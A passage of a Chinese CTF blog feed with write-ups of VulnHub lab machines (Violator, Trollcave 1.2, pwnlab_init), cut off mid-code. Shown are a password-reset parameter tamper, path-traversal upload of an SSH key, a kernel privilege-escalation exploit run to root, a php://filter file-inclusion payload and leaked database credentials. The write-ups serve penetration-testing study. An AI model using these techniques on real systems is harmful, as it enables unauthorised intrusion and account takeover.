class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD exiftool artwork.jpg</span><br><span class="line">ExifTool Version Number         : 11.01</span><br><span class="line">File Name                       : artwork.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 183 kB</span><br><span class="line">File Modification Date/Time     : 2016:06:12 14:38:12+08:00</span><br><span class="line">File Access Date/Time           : 2018:08:07 21:23:12+08:00</span><br><span class="line">File Inode Change Date/Time     : 2018:08:07 21:23:12+08:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File<span class="built_in"> Type </span>                      : JPEG</span><br><span class="line">File<span class="built_in"> Type </span>Extension             : jpg</span><br><span class="line">MIME<span class="built_in"> Type </span>                      : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">X Resolution                    : 300</span><br><span class="line">Y Resolution                    : 300</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Image Description               : Violator</span><br><span class="line">Software                        : Google</span><br><span class="line">Artist                          : Dave Gaham</span><br><span class="line">Copyright                       : UKSNRSPYLEWHKOKZARVKDEINRLIBWIUCFQRQKAQQGQLTIUCYMFENULUVFOYQDKPHSUJHFUJSAYJDFGDFRYWKLSVNJNVDVSBIBFNIFASOPFDVEYEBQYCOGULLLVQPUWISDBNLNQIJUEZACAKTPPSBBLWRHKZBJMSKLJOACGJMFVXZUEKBVWNKWEKVKDMUYFLZEOXCIXIUHJOVSZXFLOZFQTNSKXVWUHJLRAEERYTDPVNZPGUIMXZMESMAMBDVKFZSDEIQXYLJNKTBDSRYLDPPOIVUMZDFZPEWPPVHGPFBEERMDNHFIWLSHZYKOZVZYNEXGPROHLMRHFEIVIIATOAOJAOVYFVBVIYBGUZXXWFKGJCYEWNQFTPAGLNLHVCRDLFHSXHVMCERQTZOOZARBEBWCBCIKUOFQIGZPCMWRHJEMUSGYBGWXJENRZHZICACWOBJMI</span><br><span class="line">Exif Version                    : 0220</span><br><span class="line">Date/Time Original              : 1990:03:19 22:13:30</span><br><span class="line">Create Date                     : 1990:03:19 22:13:30</span><br><span class="line">Sub Sec Time Original           : 04</span><br><span class="line">Sub Sec Time Digitized          : 04</span><br><span class="line">Exif Image Width                : 1450</span><br><span class="line">Exif Image Height               : 1450</span><br><span class="line">XP Title                        : Violator</span><br><span class="line">XP Author                       : Dave Gaham</span><br><span class="line">XP Keywords                     : created by<span class="built_in"> user </span>dg</span><br><span class="line">XP Subject                      : policyoftruth</span><br><span class="line">Padding                         : (Binary data 1590 bytes, use -b option <span class="keyword">to</span> extract)</span><br><span class="line">About                           : uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b</span><br><span class="line">Rights                          : UKSNRSPYLEWHKOKZARVKDEINRLIBWIUCFQRQKAQQGQLTIUCYMFENULUVFOYQDKPHSUJHFUJSAYJDFGDFRYWKLSVNJNVDVSBIBFNIFASOPFDVEYEBQYCOGULLLVQPUWISDBNLNQIJUEZACAKTPPSBBLWRHKZBJMSKLJOACGJMFVXZUEKBVWNKWEKVKDMUYFLZEOXCIXIUHJOVSZXFLOZFQTNSKXVWUHJLRAEERYTDPVNZPGUIMXZMESMAMBDVKFZSDEIQXYLJNKTBDSRYLDPPOIVUMZDFZPEWPPVHGPFBEERMDNHFIWLSHZYKOZVZYNEXGPROHLMRHFEIVIIATOAOJAOVYFVBVIYBGUZXXWFKGJCYEWNQFTPAGLNLHVCRDLFHSXHVMCERQTZOOZARBEBWCBCIKUOFQIGZPCMWRHJEMUSGYBGWXJENRZHZICACWOBJMI</span><br><span class="line">Creator                         : Dave Gaham</span><br><span class="line">Subject                         : created by<span class="built_in"> user </span>dg</span><br><span class="line">Title                           : Violator</span><br><span class="line">Description                     : Violator</span><br><span class="line"><span class="builtin-name">Warning</span>                         : [minor] Fixed incorrect URI <span class="keyword">for</span> xmlns:MicrosoftPhoto</span><br><span class="line">Date Acquired                   : 1941:05:09 10:30:18.134</span><br><span class="line">Last Keyword XMP                : created by<span class="built_in"> user </span>dg</span><br><span class="line">Image Width                     : 1450</span><br><span class="line">Image Height                    : 1450</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span><br><span class="line">Image Size                      : 1450x1450</span><br><span class="line">Megapixels                      : 2.1</span><br><span class="line">Create Date                     : 1990:03:19 22:13:30.04</span><br><span class="line">Date/Time Original              : 1990:03:19 22:13:30.04</span><br><span class="line">➜  DOWNLOAD</span><br></pre></td></tr></table></figure><ul><li>版权那两个地方非常突出了，但是又不是base64，然后在mg目录发现的歌词和一个C程序没用上。</li></ul><blockquote><p>Lyrics:</p><ul><li>Use Wermacht with 3 rotors</li><li>Reflector to B<br>Initial: A B C<br>Alphabet Ring: C B A<br>Plug Board A-B, C-D</li></ul></blockquote><ul><li>看来那个C程序是解这串字的，但是他卡住了。</li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">➜  minarke-<span class="number">1.21</span> ./minarke </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Minarke, an Enigma M4 emulator</span><br><span class="line">by John Gilbert</span><br><span class="line"></span><br><span class="line">Emulates the Kriegsmarine M4 Enigma encryption machine</span><br><span class="line"></span><br><span class="line">Initial Setup Notes</span><br><span class="line">Rotors: Reflector (B/C), Thin Rotor (B/G), <span class="number">3</span> Rotors (<span class="number">1</span>-<span class="number">8</span>, can't reuse them) </span><br><span class="line">Use BB### <span class="keyword">or</span> CG### with A### settings to <span class="built_in">read</span>/create Wehrmacht three rotor traffic </span><br><span class="line">Ring <span class="keyword">and</span> <span class="built_in">position</span> settings: A-Z <span class="keyword">for</span> each of the <span class="number">4</span> rotors</span><br><span class="line">Reflector setting <span class="built_in">is</span> always fixed <span class="built_in">at</span> A.</span><br><span class="line">Plugboard settings: A-Z,A-Z pairs, also won't allow reuse</span><br><span class="line">Hit <span class="built_in">return</span> to end input, <span class="number">11</span> pairs recomended <span class="keyword">for</span> maximum security.</span><br><span class="line">Hit ESC <span class="built_in">at</span> any <span class="built_in">time</span> to <span class="built_in">quit</span>.</span><br><span class="line"></span><br><span class="line">Special Keys (during input mode)</span><br><span class="line"><span class="number">1</span>: rewind one setting</span><br><span class="line"><span class="number">2</span>: <span class="built_in">reset</span> <span class="built_in">position</span> settings</span><br><span class="line"><span class="number">3</span>: <span class="built_in">new</span> <span class="built_in">position</span> settings</span><br><span class="line"><span class="number">4</span>: <span class="built_in">new</span> setup</span><br><span class="line"><span class="number">9</span>: toggle debug</span><br><span class="line"><span class="number">0</span>: <span class="built_in">show</span> <span class="built_in">position</span> settings</span><br><span class="line">?: <span class="built_in">show</span> help</span><br><span class="line"></span><br><span class="line">see http://en.wikipedia.org/wiki/Enigma_machine</span><br><span class="line">also http://www.bytereef.org/m4_project.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Rotors:</span><br></pre></td></tr></table></figure><ul><li>Google找在线的解密工具，解了也看不懂，没有空格分开翻译不了，反正flag拿到了。</li></ul><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ONEFINALCHALLENGEFORYOUBGHXCONGRATULATIONSFORTHEFOURTHTIMEONSNARFINGTHEFLAGONVIOLATORILLPRESUMEBYNOWYOULLKNOWWHATIWASLISTENINGTOWHENCREATINGTHISCTFIHAVEINCLUDEDTHINGSWHICHWEREDELIBERATLYAVOIDINGTHEOBVIOUSROUTEINTOKEEPYOUONYOURTOESANOTHERTHOUGHTTOPONDERISTHATBYABUSINGPERMISSIONSYOUAREALSOBYDEFINITIONAVIOLATORSHOUTOUTSAGAINTOVULNHUBFORHOSTINGAGREATLEARNINGTOOLASPECIALTHANKSGOESTOBENRANDGKNSBFORTESTINGANDTOGTMLKFORTHEOFFERTOHOSTTHECTFAGAINKNIGHTMARE</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Write-up]-Trollcave: 1.2</title>
      <link href="/2018/07/16/Write-up-Trollcave-1-2/"/>
      <url>/2018/07/16/Write-up-Trollcave-1-2/</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul><li>下载地址：<a href="https://download.vulnhub.com/trollcave/trollcave-v1-2.ova" target="_blank" rel="noopener">点我</a></li><li>Flag：root/flag.txt</li><li>哔哩哔哩：<a href="https://www.bilibili.com/video/av27178199/" target="_blank" rel="noopener">视频</a></li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol><li>不知道VM虚拟机怎么啦，导入镜像后，用Nmap扫了，发现不了主机。所以这次用了VBox。</li><li>vboxnet0的IP为192.168.56.130，Nmap扫192.168.56.1/24，发现虚拟机IP为192.168.56.102</li></ol><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A 192.168.56.102</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-16 22:38 CST</span><br><span class="line">Nmap scan report for 192.168.56.102</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4b:ab:d7:2e:58:74:aa:86:28:dd:98:77:2f:53:d9:73 (RSA)</span><br><span class="line">|_  256 57:5e:f4:77:b3:94:91:7e:9c:55:26:30:43:64:b1:72 (ECDSA)</span><br><span class="line">80/tcp open  http    nginx 1.10.3 (Ubuntu)</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: nginx/1.10.3 (Ubuntu)</span><br><span class="line">|_http-title: Trollcave</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds</span><br></pre></td></tr></table></figure><ol start="3"><li>发现开了ssh和http就没了。先去看Web的。通过插件看到好像是一个<code>ruby-on-rails</code>框架写的，然后有几篇文章讲关于这个网站的，翻译一下就能知道其中有讲到密码找回的，是新注册的用户才可以的。旁边还有显示在线的用户和新注册的用户。</li><li>随便点开一个用户的主页发现URL是从1~17的数字，17又是新注册的，所以我们猜想1就是管理员用户。</li><li>现在尝试去找回密码，通过Google可以找到这个框架的找回密码的在<code>password_reset</code>后面加new的。详细的可以点<a href="https://www.railstutorial.org/book/password_reset" target="_blank" rel="noopener">这里</a>看一下。</li><li>打开<code>http://192.168.56.102/password_resets/new</code>输入管理员用户King发现不行，因为在上面说了，新注册的用户才可以找回密码。再输入xer这个新注册的用户。</li><li>然后有一段提示：<code>Reset email sent. http://192.168.56.102/password_resets/edit.Ec80xGP57IiFEzBpAtx4AQ?name=xer</code>把name的参数改成管理员用户King，发现可以改掉管理员的密码，改了之后登录管理员看看。</li><li>有可以上传文件的<code>http://192.168.56.102/user_files</code>还有可以开启上传文件的选项。</li><li>这里还有服务器的物理路径<code>/var/www/trollcave/public/uploads/King/crown.png</code></li><li>这个框架会新建一个<strong>rails</strong>的用户给Web服务。所以我们打算上传一个shh的公钥，这样就可以直接用ssh连接服务器了。就是上传到<strong>../../../../../../home/rails/.ssh/authorized_keys</strong>，然后ssh <a href="mailto:rails@192.168.56.102" target="_blank" rel="noopener">rails@192.168.56.102</a>连上。</li></ol><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ol><li>老套路<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>获取交互终端。</li><li><code>lsb_release -a</code>查看系统的发行版本，准备exp</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rails@trollcave:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 16.04.4 LTS</span><br><span class="line">Release:16.04</span><br><span class="line">Codename:xenial</span><br><span class="line">rails@trollcave:~$ </span><br><span class="line">rails@trollcave:~$ uname -a</span><br><span class="line">Linux trollcave 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><ol start="3"><li>搜搜exp：searchsploit 4.4.0-116，编译上传到目标主机。</li></ol><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">----------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------</span></span><br><span class="line"> Exploit Title                                                                                                                                 |  Path</span><br><span class="line">                                                                                                                                               | (/opt/exploit-database/)</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------</span></span><br><span class="line">Linux Kernel &lt; <span class="number">4.4</span><span class="number">.0</span><span class="number">-116</span> (Ubuntu <span class="number">16.04</span><span class="number">.4</span>) - Local Privilege Escalation                                                                         | exploits/linux/<span class="built_in">local</span>/<span class="number">44298.</span>c</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------</span></span><br><span class="line">Shellcodes: No Result</span><br><span class="line">Papers: No Result</span><br><span class="line"></span><br><span class="line">cp /opt/exploit-database/exploits/linux/<span class="built_in">local</span>/<span class="number">44298.</span>c <span class="built_in">exp</span>.c</span><br><span class="line">gcc <span class="built_in">exp</span>.c</span><br><span class="line">scp <span class="keyword">a</span>.out rails@<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span>:<span class="keyword">a</span>.out</span><br></pre></td></tr></table></figure><ol start="4"><li>加权限执行，拿到root权限，完事！</li></ol><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="variable">$ </span>pwd</span><br><span class="line">/home/rails</span><br><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">a.out</span><br><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x a.out </span><br><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="variable">$ </span>./a.out </span><br><span class="line">task_struct = ffff880027d29e0<span class="number">0</span></span><br><span class="line">uidptr = ffff88002ac26844</span><br><span class="line">spawning root shell</span><br><span class="line">root<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="comment"># </span></span><br><span class="line">root<span class="variable">@trollcave</span><span class="symbol">:/root</span><span class="comment"># cat flag.txt </span></span><br><span class="line">et tu, dragon?</span><br><span class="line"></span><br><span class="line">c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5</span><br><span class="line">root<span class="variable">@trollcave</span><span class="symbol">:/root</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Write-up]-pwnlab_init</title>
      <link href="/2018/07/10/Write-up-pwnlab-init/"/>
      <url>/2018/07/10/Write-up-pwnlab-init/</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul><li>下载地址<a href="https://download.vulnhub.com/pwnlab/pwnlab_init.ova" target="_blank" rel="noopener">点我</a></li><li>Flag: /root/flag.txt</li><li>放假的第一天</li><li>哔哩哔哩<a href="https://www.bilibili.com/video/av26578404/" target="_blank" rel="noopener">视频</a></li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.7.1/24 </span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-10 12:55 CST</span><br><span class="line">Nmap scan report for 192.168.7.1</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Nmap scan report for 192.168.7.130</span><br><span class="line">Host is up (0.00060s latency).</span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 2.39 seconds</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-10 12:55 CST</span><br><span class="line">Nmap scan report for 192.168.7.130</span><br><span class="line">Host is up (0.00098s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: PwnLab Intranet Image Hosting</span><br><span class="line">111/tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          44040/tcp  status</span><br><span class="line">|_  100024  1          51756/udp  status</span><br><span class="line">3306/tcp open  mysql   MySQL 5.5.47-0+deb8u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 53</span><br><span class="line">|   Version: .5.47-0+deb8u1</span><br><span class="line">|   Thread ID: 84</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">|   Some Capabilities: SupportsTransactions, Support41Auth, DontAllowDatabaseTableColumn, ConnectWithDatabase, Speaks41ProtocolOld, SupportsLoadDataLocal, FoundRows, SupportsCompression, LongColumnFlag, Speaks41ProtocolNew, InteractiveClient, IgnoreSpaceBeforeParenthesis, LongPassword, IgnoreSigpipes, ODBCClient</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|_  Salt: "]0w'Xi((0XLS:j'"r&lt;q</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds</span><br></pre></td></tr></table></figure><a id="more"></a><ol><li>开了80和3306端口，系统Debian，打开Web看看</li><li>发现URL有一个规律，可能page后面跟着是一个文件名，但是没有后缀名</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if(isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">include($_GET[&apos;page&apos;].&quot;.php&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们猜测index的代码像上面的功能一样。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.7.130/?page=login</span><br><span class="line">http://192.168.7.130/?page=upload</span><br></pre></td></tr></table></figure><ol start="3"><li>可能存在<code>LFI(local file inclusion)</code>漏洞</li><li>构造URL<code>http://192.168.7.130/?page=php://filter/convert.base64-encode/resource=login</code></li><li>发现可以包含读到文件，然后base64解密</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">---login.php---</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$mysqli = new mysqli($server, $username, $password, $database);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;user&apos;]) and isset($_POST[&apos;pass&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$luser = $_POST[&apos;user&apos;];</span><br><span class="line">$lpass = base64_encode($_POST[&apos;pass&apos;]);</span><br><span class="line"></span><br><span class="line">$stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;);</span><br><span class="line">$stmt-&gt;bind_param(&apos;ss&apos;, $luser, $lpass);</span><br><span class="line"></span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$stmt-&gt;store_Result();</span><br><span class="line"></span><br><span class="line">if ($stmt-&gt;num_rows == 1)</span><br><span class="line">&#123;</span><br><span class="line">$_SESSION[&apos;user&apos;] = $luser;</span><br><span class="line">header(&apos;Location: ?page=upload&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;Login failed.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;label&gt;Username: &lt;/label&gt;&lt;input id=&quot;user&quot; type=&quot;test&quot; name=&quot;user&quot;&gt;&lt;br /&gt;</span><br><span class="line">&lt;label&gt;Password: &lt;/label&gt;&lt;input id=&quot;pass&quot; type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>跟着再把<code>require</code>中的config读出来</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$server  = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;H4u%QJ_H99&quot;;</span><br><span class="line">$database = &quot;Users&quot;;</span><br><span class="line">?&gt;%</span><br></pre></td></tr></table></figure><ol start="7"><li>顺便也把index和upload的也读了</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">---index---</span><br><span class="line">&lt;?php</span><br><span class="line">//Multilingual. Not implemented yet.</span><br><span class="line">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span><br><span class="line">if (isset($_COOKIE[&apos;lang&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">include(&quot;lang/&quot;.$_COOKIE[&apos;lang&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">// Not implemented yet.</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span><br><span class="line">[ &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span><br><span class="line">&lt;hr/&gt;&lt;br/&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;page&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">include($_GET[&apos;page&apos;].&quot;.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span 